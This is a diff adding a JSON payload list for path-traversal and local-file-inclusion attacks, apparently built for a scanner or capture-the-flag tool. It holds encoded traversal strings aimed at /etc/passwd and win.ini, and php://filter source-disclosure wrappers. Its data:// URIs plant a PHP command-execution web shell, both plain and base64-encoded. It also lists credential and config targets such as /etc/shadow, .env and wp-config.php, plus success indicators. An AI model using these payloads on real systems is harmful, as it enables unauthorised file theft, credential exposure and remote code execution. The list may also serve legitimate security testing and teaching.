@@ -1,0 +1,67 @@
+{
+  "traversal": {
+    "unix": [
+      "../../../../../../etc/passwd",
+      "../../../../../../../etc/passwd",
+      "../../../../../../../../etc/passwd",
+      "....//....//....//....//etc/passwd",
+      "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
+      "..%252f..%252f..%252f..%252fetc%252fpasswd",
+      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+      "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
+      "..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd",
+      "....\\\\....\\\\....\\\\etc\\\\passwd",
+      "../../../../../../etc/passwd%00",
+      "../../../../../../etc/passwd%00.html",
+      "../../../../../../etc/passwd%00.jpg",
+      "/etc/passwd", "//etc/passwd",
+      "/./etc/./passwd"
+    ],
+    "windows": [
+      "..\\..\\..\\..\\..\\windows\\win.ini",
+      "..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+      "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
+      "..%255c..%255c..%255cwindows%255cwin.ini",
+      "C:\\Windows\\win.ini", "C:/Windows/win.ini"
+    ]
+  },
+  "php_wrappers": [
+    "php://filter/convert.base64-encode/resource=index.php",
+    "php://filter/convert.base64-encode/resource=config.php",
+    "php://filter/convert.base64-encode/resource=flag.php",
+    "php://filter/convert.base64-encode/resource=flag",
+    "php://filter/convert.base64-encode/resource=../config.php",
+    "php://filter/convert.base64-encode/resource=../flag.php",
+    "php://filter/read=string.rot13/resource=index.php",
+    "php://filter/read=string.rot13/resource=flag.php",
+    "php://input",
+    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
+    "data://text/plain;base64,PD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygnL2ZsYWcudHh0Jyk7Pz4=",
+    "data://text/plain,<?php system($_GET['cmd']);?>",
+    "expect://id", "phar://test.phar"
+  ],
+  "target_files": {
+    "linux": [
+      "/etc/passwd", "/etc/shadow", "/etc/hosts",
+      "/proc/self/environ", "/proc/self/cmdline",
+      "/proc/self/fd/0", "/proc/self/status",
+      "/var/log/apache2/access.log", "/var/log/apache2/error.log",
+      "/var/log/nginx/access.log", "/var/log/nginx/error.log",
+      "/flag", "/flag.txt", "/app/flag.txt",
+      "/home/flag.txt", "/opt/flag.txt", "/tmp/flag.txt",
+      "/root/flag.txt", "/var/www/html/flag.txt"
+    ],
+    "app_config": [
+      ".env", "config.php", "wp-config.php", "configuration.php",
+      "database.yml", "settings.py", "config.json", "config.yaml",
+      "application.properties", "web.config", ".htaccess",
+      "Dockerfile", "docker-compose.yml"
+    ]
+  },
+  "indicators": {
+    "linux": "root:x:0:0",
+    "windows": "[fonts]",
+    "shadow": "root:$",
+    "hosts": "localhost"
+  }
+}
